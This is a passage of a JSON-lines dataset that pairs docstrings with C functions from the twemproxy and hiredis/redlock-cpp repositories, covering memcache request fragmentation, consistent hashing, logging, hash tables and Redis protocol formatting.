2152}
{"docstring": "/*\n * Just a simple method for getting the signature\n * result must be == 16\n */\n", "func_signal": "void\nmd5_signature(unsigned char *key, unsigned long length, unsigned char *result)", "code": "{\n    MD5_CTX my_md5;\n\n    MD5_Init(&my_md5);\n    (void)MD5_Update(&my_md5, key, length);\n    MD5_Final(result, &my_md5);\n}", "path": "src\\hashkit\\nc_md5.c", "repo_name": "bitleak/twemproxy", "stars": 158, "license": "apache-2.0", "language": "c", "size": 2152}
{"docstring": "/*\n * Return true, if the memcache command is a arithmetic command, otherwise\n * return false\n */\n", "func_signal": "static bool\nmemcache_arithmetic(struct msg *r)", "code": "{\n    switch (r->type) {\n    case MSG_REQ_MC_INCR:\n    case MSG_REQ_MC_DECR:\n        return true;\n\n    default:\n        break;\n    }\n\n    return false;\n}", "path": "src\\proto\\nc_memcache.c", "repo_name": "bitleak/twemproxy", "stars": 158, "license": "apache-2.0", "language": "c", "size": 2152}
{"docstring": "/*\n * Return true, if the memcache command is a cas command, otherwise\n * return false\n */\n", "func_signal": "static bool\nmemcache_cas(struct msg *r)", "code": "{\n    if (r->type == MSG_REQ_MC_CAS) {\n        return true;\n    }\n\n    return false;\n}", "path": "src\\proto\\nc_memcache.c", "repo_name": "bitleak/twemproxy", "stars": 158, "license": "apache-2.0", "language": "c", "size": 2152}
{"docstring": "/*\n * Return true, if the memcache command is a retrieval command, otherwise\n * return false\n */\n", "func_signal": "static bool\nmemcache_retrieval(struct msg *r)", "code": "{\n    switch (r->type) {\n    case MSG_REQ_MC_GET:\n    case MSG_REQ_MC_GETS:\n        return true;\n\n    default:\n        break;\n    }\n\n    return false;\n}", "path": "src\\proto\\nc_memcache.c", "repo_name": "bitleak/twemproxy", "stars": 158, "license": "apache-2.0", "language": "c", "size": 2152}
{"docstring": "/*\n * Hexadecimal dump in the canonical hex + ascii display\n * See -C option in man hexdump\n */\n", "func_signal": "void\n_log_hexdump(const char *file, int line, char *data, int datalen,\n             const char *fmt, ...)", "code": "{\n    struct logger *l = &logger;\n    char buf[8 * LOG_MAX_LEN];\n    int i, off, len, size, errno_save;\n    ssize_t n;\n\n    if (l->fd < 0) {\n        return;\n    }\n\n    /* log hexdump */\n    errno_save = errno;\n    off = 0;                  /* data offset */\n    len = 0;                  /* length of output buffer */\n    size = 8 * LOG_MAX_LEN;   /* size of output buffer */\n\n    while (datalen != 0 && (len < size - 1)) {\n        char *save, *str;\n        unsigned char c;\n        int savelen;\n\n        len += nc_scnprintf(buf + len, size - len, \"%08x  \", off);\n\n        save = data;\n        savelen = datalen;\n\n        for (i = 0; datalen != 0 && i < 16; data++, datalen--, i++) {\n            c = (unsigned char)(*data);\n            str = (i == 7) ? \"  \" : \" \";\n            len += nc_scnprintf(buf + len, size - len, \"%02x%s\", c, str);\n        }\n        for ( ; i < 16; i++) {\n            str = (i == 7) ? \"  \" : \" \";\n            len += nc_scnprintf(buf + len, size - len, \"  %s\", str);\n        }\n\n        data = save;\n        datalen = savelen;\n\n        len += nc_scnprintf(buf + len, size - len, \"  |\");\n\n        for (i = 0; datalen != 0 && i < 16; data++, datalen--, i++) {\n            c = (unsigned char)(isprint(*data) ? *data : '.');\n            len += nc_scnprintf(buf + len, size - len, \"%c\", c);\n        }\n        len += nc_scnprintf(buf + len, size - len, \"|\\n\");\n\n        off += 16;\n    }\n\n    n = nc_write(l->fd, buf, len);\n    if (n < 0) {\n        l->nerror++;\n    }\n\n    if (len >= size - 1) {\n        n = nc_write(l->fd, \"\\n\", 1);\n        if (n < 0) {\n            l->nerror++;\n        }\n    }\n\n    errno = errno_save;\n}", "path": "src\\nc_log.c", "repo_name": "bitleak/twemproxy", "stars": 158, "license": "apache-2.0", "language": "c", "size": 2152}
{"docstring": "/*\n * Return true, if the memcache command is a touch command, otherwise\n * return false\n */\n", "func_signal": "static bool\nmemcache_touch(struct msg *r)", "code": "{\n    if (r->type == MSG_REQ_MC_TOUCH) {\n        return true;\n    }\n\n    return false;\n}", "path": "src\\proto\\nc_memcache.c", "repo_name": "bitleak/twemproxy", "stars": 158, "license": "apache-2.0", "language": "c", "size": 2152}
{"docstring": "/*\n * Calls the func once for each element in the array as long as func returns\n * success. On failure short-circuits and returns the error status.\n */\n", "func_signal": "rstatus_t\narray_each(struct array *a, array_each_t func, void *data)", "code": "{\n    uint32_t i, nelem;\n\n    ASSERT(array_n(a) != 0);\n    ASSERT(func != NULL);\n\n    for (i = 0, nelem = array_n(a); i < nelem; i++) {\n        void *elem = array_get(a, i);\n        rstatus_t status;\n\n        status = func(elem, data);\n        if (status != NC_OK) {\n            return status;\n        }\n    }\n\n    return NC_OK;\n}", "path": "src\\nc_array.c", "repo_name": "bitleak/twemproxy", "stars": 158, "license": "apache-2.0", "language": "c", "size": 2152}
{"docstring": "/*\n * read the comment in proto/nc_redis.c\n */\n", "func_signal": "static rstatus_t\nmemcache_fragment_retrieval(struct msg *r, uint32_t ncontinuum,\n                            struct msg_tqh *frag_msgq,\n                            uint32_t key_step)", "code": "{\n    struct mbuf *mbuf;\n    struct msg **sub_msgs;\n    uint32_t i;\n    rstatus_t status;\n\n    sub_msgs = nc_zalloc(ncontinuum * sizeof(*sub_msgs));\n    if (sub_msgs == NULL) {\n        return NC_ENOMEM;\n    }\n\n    ASSERT(r->frag_seq == NULL);\n    r->frag_seq = nc_alloc(array_n(r->keys) * sizeof(*r->frag_seq));\n    if (r->frag_seq == NULL) {\n        nc_free(sub_msgs);\n        return NC_ENOMEM;\n    }\n\n    mbuf = STAILQ_FIRST(&r->mhdr);\n    mbuf->pos = mbuf->start;\n\n    /*\n     * This code is based on the assumption that 'gets ' is located\n     * in a contiguous location.\n     * This is always true because we have capped our MBUF_MIN_SIZE at 512 and\n     * whenever we have multiple messages, we copy the tail message into a new mbuf\n     */\n    for (; *(mbuf->pos) != ' ';) {          /* eat get/gets  */\n        mbuf->pos++;\n    }\n    mbuf->pos++;\n\n    r->frag_id = msg_gen_frag_id();\n    r->nfrag = 0;\n    r->frag_owner = r;\n\n    for (i = 0; i < array_n(r->keys); i++) {        /* for each  key */\n        struct msg *sub_msg;\n        struct keypos *kpos = array_get(r->keys, i);\n        uint32_t idx = msg_backend_idx(r, kpos->start, kpos->end - kpos->start);\n\n        if (sub_msgs[idx] == NULL) {\n            sub_msgs[idx] = msg_get(r->owner, r->request, r->redis);\n            if (sub_msgs[idx] == NULL) {\n                nc_free(sub_msgs);\n                return NC_ENOMEM;\n            }\n        }\n        r->frag_seq[i] = sub_msg = sub_msgs[idx];\n\n        sub_msg->narg++;\n        status = memcache_append_key(sub_msg, kpos->start, kpos->end - kpos->start);\n        if (status != NC_OK) {\n            nc_free(sub_msgs);\n            return status;\n        }\n    }\n\n    for (i = 0; i < ncontinuum; i++) {     /* prepend mget header, and forward it */\n        struct msg *sub_msg = sub_msgs[i];\n        if (sub_msg == NULL) {\n            continue;\n        }\n\n        /* prepend get/gets */\n        if (r->type == MSG_REQ_MC_GET) {\n            status = msg_prepend(sub_msg, (uint8_t *)\"get \", 4);\n        } else if (r->type == MSG_REQ_MC_GETS) {\n            status = msg_prepend(sub_msg, (uint8_t *)\"gets \", 5);\n        }\n        if (status != NC_OK) {\n            nc_free(sub_msgs);\n            return status;\n        }\n\n        /* append \\r\\n */\n        status = msg_append(sub_msg, (uint8_t *)CRLF, CRLF_LEN);\n        if (status != NC_OK) {\n            nc_free(sub_msgs);\n            return status;\n        }\n\n        sub_msg->type = r->type;\n        sub_msg->frag_id = r->frag_id;\n        sub_msg->frag_owner = r->frag_owner;\n\n        TAILQ_INSERT_TAIL(frag_msgq, sub_msg, m_tqe);\n        r->nfrag++;\n    }\n\n    nc_free(sub_msgs);\n    return NC_OK;\n}", "path": "src\\proto\\nc_memcache.c", "repo_name": "bitleak/twemproxy", "stars": 158, "license": "apache-2.0", "language": "c", "size": 2152}
{"docstring": "/* 273 is 255(domain or ip)+1(:)+5(port)+1(-)+10(uint32)+1(\\0) */\n", "func_signal": "static uint32_t\nketama_hash(const char *key, size_t key_length, uint32_t alignment)", "code": "{\n    unsigned char results[16];\n\n    md5_signature((unsigned char*)key, key_length, results);\n\n    return ((uint32_t) (results[3 + alignment * 4] & 0xFF) << 24)\n        | ((uint32_t) (results[2 + alignment * 4] & 0xFF) << 16)\n        | ((uint32_t) (results[1 + alignment * 4] & 0xFF) << 8)\n        | (results[0 + alignment * 4] & 0xFF);\n}", "path": "src\\hashkit\\nc_ketama.c", "repo_name": "bitleak/twemproxy", "stars": 158, "license": "apache-2.0", "language": "c", "size": 2152}
{"docstring": "/*\n * Post-coalesce handler is invoked when the message is a response to\n * the fragmented multi vector request - 'get' or 'gets' and all the\n * responses to the fragmented request vector has been received and\n * the fragmented request is consider to be done\n */\n", "func_signal": "void\nmemcache_post_coalesce(struct msg *request)", "code": "{\n    struct msg *response = request->peer;\n    struct msg *sub_msg;\n    uint32_t i;\n    rstatus_t status;\n\n    ASSERT(!response->request);\n    ASSERT(request->request && (request->frag_owner == request));\n    if (request->error || request->ferror) {\n        response->owner->err = 1;\n        return;\n    }\n\n    for (i = 0; i < array_n(request->keys); i++) {      /* for each  key */\n        sub_msg = request->frag_seq[i]->peer;           /* get it's peer response */\n        if (sub_msg == NULL) {\n            response->owner->err = 1;\n            return;\n        }\n        status = memcache_copy_bulk(response, sub_msg);\n        if (status != NC_OK) {\n            response->owner->err = 1;\n            return;\n        }\n    }\n\n    /* append END\\r\\n */\n    status = msg_append(response, (uint8_t *)\"END\\r\\n\", 5);\n    if (status != NC_OK) {\n        response->owner->err = 1;\n        return;\n    }\n}", "path": "src\\proto\\nc_memcache.c", "repo_name": "bitleak/twemproxy", "stars": 158, "license": "apache-2.0", "language": "c", "size": 2152}
{"docstring": "/*\n * Returns true if configuration file has a valid syntax, otherwise\n * returns false\n */\n", "func_signal": "static bool\nnc_test_conf(struct instance *nci)", "code": "{\n    struct conf *cf;\n\n    cf = conf_create(nci->conf_filename);\n    if (cf == NULL) {\n        log_stderr(\"invalid config\");\n        return false;\n    }\n\n    conf_destroy(cf);\n\n    log_stderr(\"nutcracker: configuration file '%s' syntax is ok\",\n               nci->conf_filename);\n    return true;\n}", "path": "src\\nc.c", "repo_name": "bitleak/twemproxy", "stars": 158, "license": "apache-2.0", "language": "c", "size": 2152}
{"docstring": "/*\n * Copy one response from src to dst and return bytes copied\n */\n", "func_signal": "static rstatus_t\nmemcache_copy_bulk(struct msg *dst, struct msg *src)", "code": "{\n    struct mbuf *mbuf, *nbuf;\n    uint8_t *p;\n    uint32_t len = 0;\n    uint32_t bytes = 0;\n    uint32_t i = 0;\n\n    for (mbuf = STAILQ_FIRST(&src->mhdr);\n         mbuf && mbuf_empty(mbuf);\n         mbuf = STAILQ_FIRST(&src->mhdr)) {\n\n        mbuf_remove(&src->mhdr, mbuf);\n        mbuf_put(mbuf);\n    }\n\n    mbuf = STAILQ_FIRST(&src->mhdr);\n    if (mbuf == NULL) {\n        return NC_OK;           /* key not exists */\n    }\n    p = mbuf->pos;\n\n    /*\n     * get : VALUE key 0 len\\r\\nval\\r\\n\n     * gets: VALUE key 0 len cas\\r\\nval\\r\\n\n     */\n    ASSERT(*p == 'V');\n    for (i = 0; i < 3; i++) {                 /*  eat 'VALUE key 0 '  */\n        for (; *p != ' ';) {\n            p++;\n        }\n        p++;\n    }\n\n    len = 0;\n    for (; p < mbuf->last && isdigit(*p); p++) {\n        len = len * 10 + (uint32_t)(*p - '0');\n    }\n\n    for (; p < mbuf->last && ('\\r' != *p); p++) { /* eat cas for gets */\n        ;\n    }\n\n    len += CRLF_LEN * 2;\n    len += (p - mbuf->pos);\n\n    bytes = len;\n\n    /* copy len bytes to dst */\n    for (; mbuf;) {\n        if (mbuf_length(mbuf) <= len) {   /* steal this mbuf from src to dst */\n            nbuf = STAILQ_NEXT(mbuf, next);\n            mbuf_remove(&src->mhdr, mbuf);\n            mbuf_insert(&dst->mhdr, mbuf);\n            len -= mbuf_length(mbuf);\n            mbuf = nbuf;\n        } else {                        /* split it */\n            nbuf = mbuf_get();\n            if (nbuf == NULL) {\n                return NC_ENOMEM;\n            }\n            mbuf_copy(nbuf, mbuf->pos, len);\n            mbuf_insert(&dst->mhdr, nbuf);\n            mbuf->pos += len;\n            break;\n        }\n    }\n\n    dst->mlen += bytes;\n    src->mlen -= bytes;\n    log_debug(LOG_VVERB, \"memcache_copy_bulk copy bytes: %d\", bytes);\n    return NC_OK;\n}", "path": "src\\proto\\nc_memcache.c", "repo_name": "bitleak/twemproxy", "stars": 158, "license": "apache-2.0", "language": "c", "size": 2152}
{"docstring": "/*\n * Return true, if the memcache command is a storage command, otherwise\n * return false\n */\n", "func_signal": "static bool\nmemcache_storage(struct msg *r)", "code": "{\n    switch (r->type) {\n    case MSG_REQ_MC_SET:\n    case MSG_REQ_MC_CAS:\n    case MSG_REQ_MC_ADD:\n    case MSG_REQ_MC_REPLACE:\n    case MSG_REQ_MC_APPEND:\n    case MSG_REQ_MC_PREPEND:\n        return true;\n\n    default:\n        break;\n    }\n\n    return false;\n}", "path": "src\\proto\\nc_memcache.c", "repo_name": "bitleak/twemproxy", "stars": 158, "license": "apache-2.0", "language": "c", "size": 2152}
{"docstring": "/*\n * Sort nelem elements of the array in ascending order based on the\n * compare comparator.\n */\n", "func_signal": "void\narray_sort(struct array *a, array_compare_t compare)", "code": "{\n    ASSERT(a->nelem != 0);\n\n    qsort(a->elem, a->nelem, a->size, compare);\n}", "path": "src\\nc_array.c", "repo_name": "bitleak/twemproxy", "stars": 158, "license": "apache-2.0", "language": "c", "size": 2152}
{"docstring": "/* context generation */\n", "func_signal": "static void\nadjust_openfiles_limit(rlim_t maxfiles)", "code": "{\n    // Note: we just improve the open files to a higher num,\n    // while the twemproxy didn't support max client connections now.\n    struct rlimit limit;\n    rlim_t old_limit, best_limit = maxfiles, decr_step = 16;\n    if (getrlimit(RLIMIT_NOFILE, &limit) < 0 || best_limit <= limit.rlim_cur) {\n        return;\n    }\n    old_limit = limit.rlim_cur;\n    while(best_limit > old_limit) {\n        limit.rlim_cur = best_limit;\n        limit.rlim_max = best_limit;\n        if (setrlimit(RLIMIT_NOFILE,&limit) != -1) break;\n        /* We failed to set file limit to 'bestlimit'. Try with a\n         * smaller limit decrementing by a few FDs per iteration. */\n        if (best_limit < decr_step) break;\n        best_limit -= decr_step;\n    }\n}", "path": "src\\nc_core.c", "repo_name": "bitleak/twemproxy", "stars": 158, "license": "apache-2.0", "language": "c", "size": 2152}
{"docstring": "/* Add an element, discarding the old if the key already exists.\n * Return 1 if the key was added from scratch, 0 if there was already an\n * element with such key and dictReplace() just performed a value update\n * operation. */\n", "func_signal": "static int dictReplace(dict *ht, void *key, void *val)", "code": "{\n    dictEntry *entry, auxentry;\n\n    /* Try to add the element. If the key\n     * does not exists dictAdd will suceed. */\n    if (dictAdd(ht, key, val) == DICT_OK)\n        return 1;\n    /* It already exists, get the entry */\n    entry = dictFind(ht, key);\n    /* Free the old value and set the new one */\n    /* Set the new value and free the old one. Note that it is important\n     * to do that in this order, as the value may just be exactly the same\n     * as the previous one. In this context, think to reference counting,\n     * you want to increment (set), and then decrement (free), and not the\n     * reverse. */\n    auxentry = *entry;\n    dictSetHashVal(ht, entry, val);\n    dictFreeEntryVal(ht, &auxentry);\n    return 0;\n}", "path": "hiredis\\dict.c", "repo_name": "jacket-code/redlock-cpp", "stars": 177, "license": "bsd-2-clause", "language": "c", "size": 515}
{"docstring": "/* Format a command according to the Redis protocol. This function\n * takes a format similar to printf:\n *\n * %s represents a C null terminated string you want to interpolate\n * %b represents a binary safe string\n *\n * When using %b you need to provide both the pointer to the string\n * and the length in bytes as a size_t. Examples:\n *\n * len = redisFormatCommand(target, \"GET %s\", mykey);\n * len = redisFormatCommand(target, \"SET %s %b\", mykey, myval, myvallen);\n */\n", "func_signal": "int redisFormatCommand(char **target, const char *format, ...)", "code": "{\n    va_list ap;\n    int len;\n    va_start(ap,format);\n    len = redisvFormatCommand(target,format,ap);\n    va_end(ap);\n    return len;\n}", "path": "hiredis\\hiredis.c", "repo_name": "jacket-code/redlock-cpp", "stars": 177, "license": "bsd-2-clause", "language": "c", "size": 515}
{"docstring": "/* Initialize the hash table */\n", "func_signal": "static int _dictInit(dict *ht, dictType *type, void *privDataPtr)", "code": "{\n    _dictReset(ht);\n    ht->type = type;\n    ht->privdata = privDataPtr;\n    return DICT_OK;\n}", "path": "hiredis\\dict.c", "repo_name": "jacket-code/redlock-cpp", "stars": 177, "license": "bsd-2-clause", "language": "c", "size": 515}
{"docstring": "/* Format a command according to the Redis protocol. This function takes the\n * number of arguments, an array with arguments and an array with their\n * lengths. If the latter is set to NULL, strlen will be used to compute the\n * argument lengths.\n */\n", "func_signal": "int redisFormatCommandArgv(char **target, int argc, const char **argv, const size_t *argvlen)", "code": "{\n    char *cmd = NULL; /* final command */\n    int pos; /* position in final command */\n    size_t len;\n    int totlen, j;\n\n    /* Calculate number of bytes needed for the command */\n    totlen = 1+intlen(argc)+2;\n    for (j = 0; j < argc; j++) {\n        len = argvlen ? argvlen[j] : strlen(argv[j]);\n        totlen += bulklen(len);\n    }\n\n    /* Build the command at protocol level */\n    cmd = malloc(totlen+1);\n    if (cmd == NULL)\n        return -1;\n\n    pos = sprintf(cmd,\"*%d\\r\\n\",argc);\n    for (j = 0; j < argc; j++) {\n        len = argvlen ? argvlen[j] : strlen(argv[j]);\n        pos += sprintf(cmd+pos,\"$%zu\\r\\n\",len);\n        memcpy(cmd+pos,argv[j],len);\n        pos += len;\n        cmd[pos++] = '\\r';\n        cmd[pos++] = '\\n';\n    }\n    assert(pos == totlen);\n    cmd[pos] = '\\0';\n\n    *target = cmd;\n    return totlen;\n}", "path": "hiredis\\hiredis.c", "repo_name": "jacket-code/redlock-cpp", "stars": 177, "license": "bsd-2-clause", "language": "c", "size": 515}
{"docstring": "/* Use this function to handle a read event on the descriptor. It will try\n * and read some bytes from the socket and feed them to the reply parser.\n *\n * After this function is called, you may use redisContextReadReply to\n * see if there is a reply available. */\n", "func_signal": "int redisBufferRead(redisContext *c)", "code": "{\n    char buf[1024*16];\n    int nread;\n\n    /* Return early when the context has seen an error. */\n    if (c->err)\n        return REDIS_ERR;\n\n    nread = read(c->fd,buf,sizeof(buf));\n    if (nread == -1) {\n        if ((errno == EAGAIN && !(c->flags & REDIS_BLOCK)) || (errno == EINTR)) {\n            /* Try again later */\n        } else {\n            __redisSetError(c,REDIS_ERR_IO,NULL);\n            return REDIS_ERR;\n        }\n    } else if (nread == 0) {\n        __redisSetError(c,REDIS_ERR_EOF,\"Server closed the connection\");\n        return REDIS_ERR;\n    } else {\n        if (redisReaderFeed(c->reader,buf,nread) != REDIS_OK) {\n            __redisSetError(c,c->reader->err,c->reader->errstr);\n            return REDIS_ERR;\n        }\n    }\n    return REDIS_OK;\n}", "path": "hiredis\\hiredis.c", "repo_name": "jacket-code/redlock-cpp", "stars": 177, "license": "bsd-2-clause", "language": "c", "size": 515}
{"docstring": "/* Helper function for the redisCommand* family of functions.\n *\n * Write a formatted command to the output buffer. If the given context is\n * blocking, immediately read the reply into the \"reply\" pointer. When the\n * context is non-blocking, the \"reply\" pointer will not be used and the\n * command is simply appended to the write buffer.\n *\n * Returns the reply when a reply was succesfully retrieved. Returns NULL\n * otherwise. When NULL is returned in a blocking context, the error field\n * in the context will be set.\n */\n", "func_signal": "static void *__redisBlockForReply(redisContext *c)", "code": "{\n    void *reply;\n\n    if (c->flags & REDIS_BLOCK) {\n        if (redisGetReply(c,&reply) != REDIS_OK)\n            return NULL;\n        return reply;\n    }\n    return NULL;\n}", "path": "hiredis\\hiredis.c", "repo_name": "jacket-code/redlock-cpp", "stars": 177, "license": "bsd-2-clause", "language": "c", "size": 515}
{"docstring": "/* Our hash table capability is a power of two */\n", "func_signal": "static unsigned long _dictNextPower(unsigned long size)", "code": "{\n    unsigned long i = DICT_HT_INITIAL_SIZE;\n\n    if (size >= LONG_MAX) return LONG_MAX;\n    while(1) {\n        if (i >= size)\n            return i;\n        i *= 2;\n    }\n}", "path": "hiredis\\dict.c", "repo_name": "jacket-code/redlock-cpp", "stars": 177, "license": "bsd-2-clause", "language": "c", "size": 515}
{"docstring": "/* Expand the hash table if needed */\n", "func_signal": "static int _dictExpandIfNeeded(dict *ht)", "code": "{\n    /* If the hash table is empty expand it to the intial size,\n     * if the table is \"full\" dobule its size. */\n    if (ht->size == 0)\n        return dictExpand(ht, DICT_HT_INITIAL_SIZE);\n    if (ht->used == ht->size)\n        return dictExpand(ht, ht->size*2);\n    return DICT_OK;\n}", "path": "hiredis\\dict.c", "repo_name": "jacket-code/redlock-cpp", "stars": 177, "license": "bsd-2-clause", "language": "c", "size": 515}
{"docstring": "/* Expand or create the hashtable */\n", "func_signal": "static int dictExpand(dict *ht, unsigned long size)", "code": "{\n    dict n; /* the new hashtable */\n    unsigned long realsize = _dictNextPower(size), i;\n\n    /* the size is invalid if it is smaller than the number of\n     * elements already inside the hashtable */\n    if (ht->used > size)\n        return DICT_ERR;\n\n    _dictInit(&n, ht->type, ht->privdata);\n    n.size = realsize;\n    n.sizemask = realsize-1;\n    n.table = calloc(realsize,sizeof(dictEntry*));\n\n    /* Copy all the elements from the old to the new table:\n     * note that if the old hash table is empty ht->size is zero,\n     * so dictExpand just creates an hash table. */\n    n.used = ht->used;\n    for (i = 0; i < ht->size && ht->used > 0; i++) {\n        dictEntry *he, *nextHe;\n\n        if (ht->table[i] == NULL) continue;\n\n        /* For each hash entry on this slot... */\n        he = ht->table[i];\n        while(he) {\n            unsigned int h;\n\n            nextHe = he->next;\n            /* Get the new element index */\n            h = dictHashKey(ht, he->key) & n.sizemask;\n            he->next = n.table[h];\n            n.table[h] = he;\n            ht->used--;\n            /* Pass to the next element */\n            he = nextHe;\n        }\n    }\n    assert(ht->used == 0);\n    free(ht->table);\n\n    /* Remap the new hashtable in the old */\n    *ht = n;\n    return DICT_OK;\n}", "path": "hiredis\\dict.c", "repo_name": "jacket-code/redlock-cpp", "stars": 177, "license": "bsd-2-clause", "language": "c", "size": 515}
{"docstring": "/* Clear & Release the hash table */\n", "func_signal": "static void dictRelease(dict *ht)", "code": "{\n    _dictClear(ht);\n    free(ht);\n}", "path": "hiredis\\dict.c", "repo_name": "jacket-code/redlock-cpp", "stars": 177, "license": "bsd-2-clause", "language": "c", "size": 515}
{"docstring": "/* Create a reply object */\n", "func_signal": "static redisReply *createReplyObject(int type)", "code": "{\n    redisReply *r = calloc(1,sizeof(*r));\n\n    if (r == NULL)\n        return NULL;\n\n    r->type = type;\n    return r;\n}", "path": "hiredis\\hiredis.c", "repo_name": "jacket-code/redlock-cpp", "stars": 177, "license": "bsd-2-clause", "language": "c", "size": 515}
{"docstring": "/* Create a new hash table */\n", "func_signal": "static dict *dictCreate(dictType *type, void *privDataPtr)", "code": "{\n    dict *ht = malloc(sizeof(*ht));\n    _dictInit(ht,type,privDataPtr);\n    return ht;\n}", "path": "hiredis\\dict.c", "repo_name": "jacket-code/redlock-cpp", "stars": 177, "license": "bsd-2-clause", "language": "c", "size": 515}
{"docstring": "/* Calculate the number of bytes needed to represent an integer as string. */\n", "func_signal": "static int intlen(int i)", "code": "{\n    int len = 0;\n    if (i < 0) {\n        len++;\n        i = -i;\n    }\n    do {\n        len++;\n        i /= 10;\n    } while(i);\n    return len;\n}", "path": "hiredis\\hiredis.c", "repo_name": "jacket-code/redlock-cpp", "stars": 177, "license": "bsd-2-clause", "language": "c", "size": 515}
{"docstring": "/* Search and remove an element */\n", "func_signal": "static int dictDelete(dict *ht, const void *key)", "code": "{\n    unsigned int h;\n    dictEntry *de, *prevde;\n\n    if (ht->size == 0)\n        return DICT_ERR;\n    h = dictHashKey(ht, key) & ht->sizemask;\n    de = ht->table[h];\n\n    prevde = NULL;\n    while(de) {\n        if (dictCompareHashKeys(ht,key,de->key)) {\n            /* Unlink the element from the list */\n            if (prevde)\n                prevde->next = de->next;\n            else\n                ht->table[h] = de->next;\n\n            dictFreeEntryKey(ht,de);\n            dictFreeEntryVal(ht,de);\n            free(de);\n            ht->used--;\n            return DICT_OK;\n        }\n        prevde = de;\n        de = de->next;\n    }\n    return DICT_ERR; /* not found */\n}", "path": "hiredis\\dict.c", "repo_name": "jacket-code/redlock-cpp", "stars": 177, "license": "bsd-2-clause", "language": "c", "size": 515}
{"docstring": "/* Write the output buffer to the socket.\n *\n * Returns REDIS_OK when the buffer is empty, or (a part of) the buffer was\n * succesfully written to the socket. When the buffer is empty after the\n * write operation, \"done\" is set to 1 (if given).\n *\n * Returns REDIS_ERR if an error occured trying to write and sets\n * c->errstr to hold the appropriate error string.\n */\n", "func_signal": "int redisBufferWrite(redisContext *c, int *done)", "code": "{\n    int nwritten;\n\n    /* Return early when the context has seen an error. */\n    if (c->err)\n        return REDIS_ERR;\n\n    if (sdslen(c->obuf) > 0) {\n        nwritten = write(c->fd,c->obuf,sdslen(c->obuf));\n        if (nwritten == -1) {\n            if ((errno == EAGAIN && !(c->flags & REDIS_BLOCK)) || (errno == EINTR)) {\n                /* Try again later */\n            } else {\n                __redisSetError(c,REDIS_ERR_IO,NULL);\n                return REDIS_ERR;\n            }\n        } else if (nwritten > 0) {\n            if (nwritten == (signed)sdslen(c->obuf)) {\n                sdsfree(c->obuf);\n                c->obuf = sdsempty();\n            } else {\n                sdsrange(c->obuf,nwritten,-1);\n            }\n        }\n    }\n    if (done != NULL) *done = (sdslen(c->obuf) == 0);\n    return REDIS_OK;\n}", "path": "hiredis\\hiredis.c", "repo_name": "jacket-code/redlock-cpp", "stars": 177, "license": "bsd-2-clause", "language": "c", "size": 515}
{"docstring": "/* Connect to a Redis instance. On error the field error in the returned\n * context will be set to the return value of the error function.\n * When no set of reply functions is given, the default set will be used. */\n", "func_signal": "redisContext *redisConnect(const char *ip, int port)", "code": "{\n    redisContext *c;\n\n    c = redisContextInit();\n    if (c == NULL)\n        return NULL;\n\n    c->flags |= REDIS_BLOCK;\n    redisContextConnectTcp(c,ip,port,NULL);\n    return c;\n}", "path": "hiredis\\hiredis.c", "repo_name": "jacket-code/redlock-cpp", "stars": 177, "license": "bsd-2-clause", "language": "c", "size": 515}
{"docstring": "/* Returns the index of a free slot that can be populated with\n * an hash entry for the given 'key'.\n * If the key already exists, -1 is returned. */\n", "func_signal": "static int _dictKeyIndex(dict *ht, const void *key)", "code": "{\n    unsigned int h;\n    dictEntry *he;\n\n    /* Expand the hashtable if needed */\n    if (_dictExpandIfNeeded(ht) == DICT_ERR)\n        return -1;\n    /* Compute the key hash value */\n    h = dictHashKey(ht, key) & ht->sizemask;\n    /* Search if this slot does not already contain the given key */\n    he = ht->table[h];\n    while(he) {\n        if (dictCompareHashKeys(ht, key, he->key))\n            return -1;\n        he = he->next;\n    }\n    return h;\n}", "path": "hiredis\\dict.c", "repo_name": "jacket-code/redlock-cpp", "stars": 177, "license": "bsd-2-clause", "language": "c", "size": 515}
{"docstring": "/* Helper function for the redisAppendCommand* family of functions.\n *\n * Write a formatted command to the output buffer. When this family\n * is used, you need to call redisGetReply yourself to retrieve\n * the reply (or replies in pub/sub).\n */\n", "func_signal": "int __redisAppendCommand(redisContext *c, const char *cmd, size_t len)", "code": "{\n    sds newbuf;\n\n    newbuf = sdscatlen(c->obuf,cmd,len);\n    if (newbuf == NULL) {\n        __redisSetError(c,REDIS_ERR_OOM,\"Out of memory\");\n        return REDIS_ERR;\n    }\n\n    c->obuf = newbuf;\n    return REDIS_OK;\n}", "path": "hiredis\\hiredis.c", "repo_name": "jacket-code/redlock-cpp", "stars": 177, "license": "bsd-2-clause", "language": "c", "size": 515}
{"docstring": "/* Destroy an entire hash table */\n", "func_signal": "static int _dictClear(dict *ht)", "code": "{\n    unsigned long i;\n\n    /* Free all the elements */\n    for (i = 0; i < ht->size && ht->used > 0; i++) {\n        dictEntry *he, *nextHe;\n\n        if ((he = ht->table[i]) == NULL) continue;\n        while(he) {\n            nextHe = he->next;\n            dictFreeEntryKey(ht, he);\n            dictFreeEntryVal(ht, he);\n            free(he);\n            ht->used--;\n            he = nextHe;\n        }\n    }\n    /* Free the table and the allocated cache structure */\n    free(ht->table);\n    /* Re-initialize the table */\n    _dictReset(ht);\n    return DICT_OK; /* never fails */\n}", "path": "hiredis\\dict.c", "repo_name": "jacket-code/redlock-cpp", "stars": 177, "license": "bsd-2-clause", "language": "c", "size": 515}
{"docstring": "/* Add an element to the target hash table */\n", "func_signal": "static int dictAdd(dict *ht, void *key, void *val)", "code": "{\n    int index;\n    dictEntry *entry;\n\n    /* Get the index of the new element, or -1 if\n     * the element already exists. */\n    if ((index = _dictKeyIndex(ht, key)) == -1)\n        return DICT_ERR;\n\n    /* Allocates the memory and stores key */\n    entry = malloc(sizeof(*entry));\n    entry->next = ht->table[index];\n    ht->table[index] = entry;\n\n    /* Set the hash entry fields. */\n    dictSetHashKey(ht, entry, key);\n    dictSetHashVal(ht, entry, val);\n    ht->used++;\n    return DICT_OK;\n}", "path": "hiredis\\dict.c", "repo_name": "jacket-code/redlock-cpp", "stars": 177, "license": "bsd-2-clause", "language": "c", "size": 515}
{"docstring": "/****************************************************************************/\n/*                                                                          */\n/* Evict (delete) a  Key from the TPM                                       */\n/*                                                                          */\n/* The arguments are...                                                     */\n/*                                                                          */\n/* keyhandle is the handle of the key to be evicted                         */\n/*                                                                          */\n/****************************************************************************/\n", "func_signal": "static uint32_t TPM_EvictKey_Internal(uint32_t keyhandle, int allowTransport)", "code": "{\n   uint32_t ret;\n   STACK_TPM_BUFFER( tpmdata)\n   char *version = getenv(\"TPM_VERSION\");\n\n   if (version == NULL || !strcmp(\"11\",version)) {\n     ret = TSS_buildbuff(\"00 c1 T 00 00 00 22 L\",&tpmdata, keyhandle);\n     if ((ret & 